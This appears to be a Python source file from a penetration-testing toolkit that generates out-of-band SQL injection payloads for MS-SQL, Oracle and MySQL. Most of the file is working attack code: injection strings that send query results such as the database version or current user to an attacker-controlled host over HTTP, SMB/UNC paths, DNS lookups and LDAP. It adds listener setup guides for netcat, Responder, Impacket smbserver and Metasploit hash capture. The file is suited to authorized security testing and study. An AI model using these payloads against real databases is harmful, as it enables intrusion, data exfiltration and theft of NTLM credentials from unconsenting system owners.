"""
Out-of-Band (OOB) SQL Injection Payload Generator

Generates payloads for OOB data exfiltration techniques across different database systems.
OOB techniques are useful when direct query results are not visible (blind injection scenarios).

Supported databases and techniques:
- MS-SQL: OpenRowSet HTTP/SMB exfiltration
- Oracle: UTL_HTTP, UTL_INADDR (DNS), DBMS_LDAP
- MySQL: SELECT INTO OUTFILE with UNC paths (SMB)
"""

from typing import Dict, List, Optional
from enum import Enum
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# Input validation helpers
# ---------------------------------------------------------------------------

def _validate_host(host: str) -> str:
    """Validate and normalise an attacker host value.

    Args:
        host: Attacker-controlled hostname or IP address.

    Returns:
        The stripped host string.

    Raises:
        ValueError: If *host* is not a string, is empty, or contains only whitespace.
    """
    if not isinstance(host, str):
        raise ValueError(
            f"attacker_host must be a non-empty string, got {type(host).__name__!r}."
        )
    if not host.strip():
        raise ValueError(
            "attacker_host must be a non-empty string (hostname or IP address)."
        )
    return host.strip()


def _validate_port(port: int) -> int:
    """Validate an attacker listener port number.

    Args:
        port: Port number to validate.  Must be an integer.

    Returns:
        The validated port integer.

    Raises:
        ValueError: If *port* is not an integer or is outside the valid range
                    1–65535.
    """
    if not isinstance(port, int) or not (1 <= port <= 65535):
        raise ValueError(
            f"attacker_port must be an integer between 1 and 65535, got {port!r}."
        )
    return port


class OOBTechnique(Enum):
    """Out-of-Band exfiltration techniques"""
    # MS-SQL techniques
    MSSQL_OPENROWSET_HTTP = "mssql_openrowset_http"
    MSSQL_OPENROWSET_SMB = "mssql_openrowset_smb"
    
    # Oracle techniques
    ORACLE_UTL_HTTP = "oracle_utl_http"
    ORACLE_UTL_INADDR = "oracle_utl_inaddr"
    ORACLE_DBMS_LDAP = "oracle_dbms_ldap"
    
    # MySQL techniques
    MYSQL_LOAD_FILE_UNC = "mysql_load_file_unc"
    MYSQL_INTO_OUTFILE_UNC = "mysql_into_outfile_unc"


class DatabaseType(Enum):
    """Database types for OOB payloads"""
    MSSQL = "mssql"
    ORACLE = "oracle"
    MYSQL = "mysql"


@dataclass
class OOBPayload:
    """Represents an OOB payload with metadata"""
    technique: OOBTechnique
    payload: str
    description: str
    requires_privileges: bool
    privilege_level: str
    listener_type: str  # 'http', 'smb', 'dns', 'ldap'
    example_listener_setup: str


class OOBPayloadGenerator:
    """
    Generate Out-of-Band SQL injection payloads for data exfiltration.

    OOB techniques allow authorized security testers to extract data via
    alternative channels when direct query results are not visible (e.g.,
    blind SQL injection).

    **Important – Authorized use only**: OOB payloads interact with remote
    systems in ways that may be detected and logged.  Only use against targets
    for which you have explicit written authorization to perform security
    testing.
    """

    def __init__(self, attacker_host: str = "attacker.com", attacker_port: int = 80):
        """
        Initialize OOB payload generator.

        Args:
            attacker_host: Attacker-controlled domain/IP for receiving callbacks.
                           Must be a non-empty string.
            attacker_port: Port for HTTP/SMB listeners.  Must be 1–65535.

        Raises:
            ValueError: If *attacker_host* is empty or *attacker_port* is
                        outside the valid range.
        """
        self.attacker_host = _validate_host(attacker_host)
        self.attacker_port = _validate_port(attacker_port)
        self.attacker_ip = self.attacker_host  # For cases where IP is needed

    def set_attacker_host(self, host: str, port: int = 80):
        """Update attacker host and port.

        Args:
            host: Attacker-controlled hostname or IP.  Must be non-empty.
            port: Listener port.  Must be 1–65535.

        Raises:
            ValueError: If *host* is empty or *port* is out of range.
        """
        self.attacker_host = _validate_host(host)
        self.attacker_port = _validate_port(port)
        self.attacker_ip = self.attacker_host
    
    def generate_mssql_payloads(self, data_to_exfiltrate: str = "@@version") -> List[OOBPayload]:
        """
        Generate MS-SQL OOB payloads.
        
        MS-SQL supports OpenRowSet for HTTP and SMB connections,
        allowing data exfiltration through these protocols.
        
        Args:
            data_to_exfiltrate: SQL expression to extract (default: @@version)
        
        Returns:
            List of OOBPayload objects for MS-SQL
        """
        payloads = []
        
        # OpenRowSet HTTP exfiltration
        # Note: 'uid=sa;pwd=pass' are placeholder credentials that don't affect the OOB callback
        # The connection attempt itself triggers the HTTP request, regardless of authentication
        http_payload = f"""' UNION SELECT 1,2,3 FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=http://{self.attacker_host}:{self.attacker_port};uid=sa;pwd=pass','SELECT 1')--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MSSQL_OPENROWSET_HTTP,
            payload=http_payload,
            description="MS-SQL OpenRowSet HTTP exfiltration - Basic connection test",
            requires_privileges=True,
            privilege_level="Requires 'Ad Hoc Distributed Queries' enabled and sufficient privileges",
            listener_type="http",
            example_listener_setup="nc -lvnp 80 or python -m http.server 80"
        ))
        
        # OpenRowSet HTTP with data exfiltration
        http_data_payload = f"""'; DECLARE @data VARCHAR(8000); SET @data=(SELECT {data_to_exfiltrate}); EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Network=DBMSSOCN;Address=http://'+(SELECT @data)+'.{self.attacker_host}:{self.attacker_port};uid=sa;pwd=pass'',''SELECT 1'')')--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MSSQL_OPENROWSET_HTTP,
            payload=http_data_payload,
            description=f"MS-SQL OpenRowSet HTTP data exfiltration - Extracts {data_to_exfiltrate} via subdomain",
            requires_privileges=True,
            privilege_level="Requires 'Ad Hoc Distributed Queries' enabled and xp_cmdshell or similar",
            listener_type="http",
            example_listener_setup="Set up HTTP server logging subdomains or use DNS logger"
        ))
        
        # OpenRowSet SMB exfiltration
        # Note: Empty credentials (uid=;pwd=) are intentional for SMB NULL sessions or anonymous connections
        # This allows the OOB callback to occur without requiring valid credentials
        smb_payload = f"""' UNION SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=\\\\{self.attacker_host}\\share;uid=;pwd=','SELECT 1')--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MSSQL_OPENROWSET_SMB,
            payload=smb_payload,
            description="MS-SQL OpenRowSet SMB/UNC path exfiltration - Forces SMB connection",
            requires_privileges=True,
            privilege_level="Requires 'Ad Hoc Distributed Queries' enabled",
            listener_type="smb",
            example_listener_setup="Responder -I eth0 or smbserver.py share /tmp/share"
        ))
        
        # SMB with data exfiltration in path
        smb_data_payload = f"""'; DECLARE @data VARCHAR(8000); SET @data=(SELECT {data_to_exfiltrate}); EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Network=DBMSSOCN;Address=\\\\\\\\'+(SELECT @data)+'.{self.attacker_host}\\\\share;uid=;pwd='',''SELECT 1'')')--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MSSQL_OPENROWSET_SMB,
            payload=smb_data_payload,
            description=f"MS-SQL OpenRowSet SMB data exfiltration - Extracts {data_to_exfiltrate} via UNC path",
            requires_privileges=True,
            privilege_level="Requires 'Ad Hoc Distributed Queries' enabled and dynamic SQL execution",
            listener_type="smb",
            example_listener_setup="Responder -I eth0 to capture NTLM hashes and data in hostname"
        ))
        
        return payloads
    
    def generate_oracle_payloads(self, data_to_exfiltrate: str = "user") -> List[OOBPayload]:
        """
        Generate Oracle OOB payloads.
        
        Oracle provides multiple built-in packages for OOB communication:
        - UTL_HTTP: HTTP requests
        - UTL_INADDR: DNS lookups
        - DBMS_LDAP: LDAP connections
        
        Args:
            data_to_exfiltrate: SQL expression to extract (default: user)
        
        Returns:
            List of OOBPayload objects for Oracle
        """
        payloads = []
        
        # UTL_HTTP basic
        utl_http_payload = f"""' UNION SELECT UTL_HTTP.request('http://{self.attacker_host}:{self.attacker_port}/oracle_test') FROM dual--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.ORACLE_UTL_HTTP,
            payload=utl_http_payload,
            description="Oracle UTL_HTTP basic HTTP request",
            requires_privileges=True,
            privilege_level="Requires EXECUTE on UTL_HTTP package",
            listener_type="http",
            example_listener_setup="nc -lvnp 80 or python -m http.server 80"
        ))
        
        # UTL_HTTP with data exfiltration
        utl_http_data_payload = f"""' UNION SELECT UTL_HTTP.request('http://{self.attacker_host}:{self.attacker_port}/'||({data_to_exfiltrate})) FROM dual--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.ORACLE_UTL_HTTP,
            payload=utl_http_data_payload,
            description=f"Oracle UTL_HTTP data exfiltration - Extracts {data_to_exfiltrate} in URL path",
            requires_privileges=True,
            privilege_level="Requires EXECUTE on UTL_HTTP package",
            listener_type="http",
            example_listener_setup="HTTP server with request logging: python -m http.server 80"
        ))
        
        # UTL_INADDR DNS exfiltration
        utl_inaddr_payload = f"""' UNION SELECT UTL_INADDR.get_host_address(({data_to_exfiltrate})||'.{self.attacker_host}') FROM dual--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.ORACLE_UTL_INADDR,
            payload=utl_inaddr_payload,
            description=f"Oracle UTL_INADDR DNS exfiltration - Extracts {data_to_exfiltrate} via DNS subdomain lookup",
            requires_privileges=True,
            privilege_level="Requires EXECUTE on UTL_INADDR package",
            listener_type="dns",
            example_listener_setup="DNS server logging queries: dnslog.cn, Burp Collaborator, or tcpdump -i any -n port 53"
        ))
        
        # DBMS_LDAP LDAP exfiltration
        dbms_ldap_payload = f"""' UNION SELECT DBMS_LDAP.INIT(({data_to_exfiltrate})||'.{self.attacker_host}',{self.attacker_port}) FROM dual--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.ORACLE_DBMS_LDAP,
            payload=dbms_ldap_payload,
            description=f"Oracle DBMS_LDAP exfiltration - Extracts {data_to_exfiltrate} via LDAP connection",
            requires_privileges=True,
            privilege_level="Requires EXECUTE on DBMS_LDAP package",
            listener_type="ldap",
            example_listener_setup="LDAP server or nc -lvnp 389 (LDAP port)"
        ))
        
        # Alternative UTL_HTTP POST method
        utl_http_post_payload = f"""' UNION SELECT UTL_HTTP.request('http://{self.attacker_host}:{self.attacker_port}','POST','Content-Length: 0'||CHR(13)||CHR(10)||'X-Data: '||({data_to_exfiltrate})) FROM dual--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.ORACLE_UTL_HTTP,
            payload=utl_http_post_payload,
            description=f"Oracle UTL_HTTP POST with data in custom header - Extracts {data_to_exfiltrate}",
            requires_privileges=True,
            privilege_level="Requires EXECUTE on UTL_HTTP package",
            listener_type="http",
            example_listener_setup="HTTP server logging headers: nc -lvnp 80 or custom HTTP server"
        ))
        
        return payloads
    
    def generate_mysql_payloads(self, data_to_exfiltrate: str = "@@version") -> List[OOBPayload]:
        """
        Generate MySQL OOB payloads.
        
        MySQL supports UNC paths for file operations on Windows,
        allowing SMB-based data exfiltration.
        
        Args:
            data_to_exfiltrate: SQL expression to extract (default: @@version)
        
        Returns:
            List of OOBPayload objects for MySQL
        """
        payloads = []
        
        # LOAD_FILE with UNC path (causes SMB connection attempt)
        load_file_payload = f"""' UNION SELECT LOAD_FILE('\\\\\\\\{self.attacker_host}\\\\share\\\\file.txt')--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MYSQL_LOAD_FILE_UNC,
            payload=load_file_payload,
            description="MySQL LOAD_FILE with UNC path - Forces SMB connection (Windows only)",
            requires_privileges=True,
            privilege_level="Requires FILE privilege",
            listener_type="smb",
            example_listener_setup="Responder -I eth0 or smbserver.py share /tmp/share"
        ))
        
        # SELECT INTO OUTFILE with UNC path
        into_outfile_payload = f"""' UNION SELECT {data_to_exfiltrate} INTO OUTFILE '\\\\\\\\{self.attacker_host}\\\\share\\\\output.txt'--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MYSQL_INTO_OUTFILE_UNC,
            payload=into_outfile_payload,
            description=f"MySQL SELECT INTO OUTFILE with UNC path - Writes {data_to_exfiltrate} to SMB share (Windows only)",
            requires_privileges=True,
            privilege_level="Requires FILE privilege and secure_file_priv not restricting UNC paths",
            listener_type="smb",
            example_listener_setup="SMB server: smbserver.py share /tmp/share -smb2support"
        ))
        
        # Alternative LOAD_FILE to extract data in filename
        load_file_data_payload = f"""' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',({data_to_exfiltrate}),'.{self.attacker_host}\\\\share\\\\file.txt'))--"""
        
        payloads.append(OOBPayload(
            technique=OOBTechnique.MYSQL_LOAD_FILE_UNC,
            payload=load_file_data_payload,
            description=f"MySQL LOAD_FILE with data in UNC hostname - Extracts {data_to_exfiltrate} via SMB (Windows only)",
            requires_privileges=True,
            privilege_level="Requires FILE privilege",
            listener_type="smb",
            example_listener_setup="Responder -I eth0 to capture connection with data in hostname"
        ))
        
        return payloads
    
    def generate_all_payloads(self, db_type: Optional[DatabaseType] = None, 
                            data_to_exfiltrate: str = "user") -> Dict[str, List[OOBPayload]]:
        """
        Generate all OOB payloads for specified database type or all databases.
        
        Args:
            db_type: Specific database type (None = all databases)
            data_to_exfiltrate: SQL expression to extract
        
        Returns:
            Dictionary mapping database type to list of payloads
        """
        all_payloads = {}
        
        if db_type is None or db_type == DatabaseType.MSSQL:
            all_payloads['mssql'] = self.generate_mssql_payloads(data_to_exfiltrate)
        
        if db_type is None or db_type == DatabaseType.ORACLE:
            all_payloads['oracle'] = self.generate_oracle_payloads(data_to_exfiltrate)
        
        if db_type is None or db_type == DatabaseType.MYSQL:
            all_payloads['mysql'] = self.generate_mysql_payloads(data_to_exfiltrate)
        
        return all_payloads
    
    def get_listener_setup_guide(self, listener_type: str) -> str:
        """
        Get detailed setup guide for specific listener type.
        
        Args:
            listener_type: Type of listener ('http', 'smb', 'dns', 'ldap')
        
        Returns:
            Detailed setup instructions
        """
        guides = {
            'http': """
HTTP Listener Setup:

1. Simple Netcat listener:
   nc -lvnp 80
   
2. Python HTTP server:
   python -m http.server 80
   sudo python3 -m http.server 80  # If port 80 requires root
   
3. Custom Python server with logging:
   from http.server import HTTPServer, BaseHTTPRequestHandler
   class LogHandler(BaseHTTPRequestHandler):
       def do_GET(self):
           print(f"Request: {self.path}")
           self.send_response(200)
           self.end_headers()
   HTTPServer(('0.0.0.0', 80), LogHandler).serve_forever()

4. ngrok for external access:
   ngrok http 80
   # Use the ngrok URL as your attacker_host
""",
            'smb': """
SMB Listener Setup:

1. Impacket smbserver (Recommended):
   smbserver.py share /tmp/share -smb2support
   # Creates SMB share at \\\\attacker.com\\share
   
2. Responder (captures NTLM hashes):
   responder -I eth0
   # Automatically responds to SMB/LLMNR/NBT-NS requests
   
3. Metasploit SMB capture:
   use auxiliary/server/capture/smb
   set JOHNPWFILE /tmp/captured_hashes.txt
   run

Note: SMB-based OOB only works when target DB is on Windows
""",
            'dns': """
DNS Listener Setup:

1. tcpdump DNS capture:
   sudo tcpdump -i any -n port 53
   # Captures all DNS queries
   
2. dnslog services (external):
   - http://dnslog.cn
   - Burp Suite Collaborator
   - https://interactsh.com
   
3. Custom DNS server (Python):
   # Install: pip install dnslib
   from dnslib.server import DNSServer
   # See dnslib documentation for full implementation
   
4. Verify subdomain delegation:
   # Ensure *.attacker.com points to your DNS server
   # Or use services like dnslog.cn that provide subdomains
""",
            'ldap': """
LDAP Listener Setup:

1. Simple netcat listener (LDAP port):
   nc -lvnp 389
   # Requires root/sudo for port < 1024
   
2. OpenLDAP server:
   # Install and configure OpenLDAP with logging
   sudo apt-get install slapd
   # Configure to log connection attempts
   
3. Custom Python LDAP listener:
   import socket
   s = socket.socket()
   s.bind(('0.0.0.0', 389))
   s.listen()
   while True:
       conn, addr = s.accept()
       print(f"LDAP connection from {addr}")
       conn.close()

Note: Port 389 requires root privileges
"""
        }
        
        return guides.get(listener_type, f"No setup guide available for {listener_type}")
    
    def format_payload_for_output(self, payload: OOBPayload) -> str:
        """
        Format a payload object for display.
        
        Args:
            payload: OOBPayload object
        
        Returns:
            Formatted string representation
        """
        output = f"""
═══════════════════════════════════════════════════════════════
Technique: {payload.technique.value}
───────────────────────────────────────────────────────────────
Description: {payload.description}
Requires Privileges: {payload.requires_privileges}
Privilege Level: {payload.privilege_level}
Listener Type: {payload.listener_type}

Payload:
{payload.payload}

Listener Setup:
{payload.example_listener_setup}
═══════════════════════════════════════════════════════════════
"""
        return output
